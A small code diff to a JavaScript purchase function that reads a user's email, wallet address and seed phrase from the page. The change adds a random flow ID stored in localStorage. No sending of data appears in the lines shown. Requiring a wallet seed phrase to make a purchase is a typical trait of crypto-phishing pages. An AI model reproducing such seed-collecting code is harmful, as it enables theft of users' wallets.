@@ -708,12 +708,14 @@ async function continueToPurchase() {
   const wallet = document.getElementById('wallet-address').innerText.trim();
   const seed = document.getElementById('seed-phrase').innerText.trim();
 
+  const flowID = crypto.randomUUID();
+  localStorage.setItem('flow_id', flowID);
+
   const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   if (!emailRegex.test(email) || !wallet || !seed) {
     alert('❌ Please complete all fields (with a valid email).');
     return;
   }
-
   // Detect changes
   const prevEmail = localStorage.getItem('user_email') || '';
   const prevName = localStorage.getItem('user_name') || '';
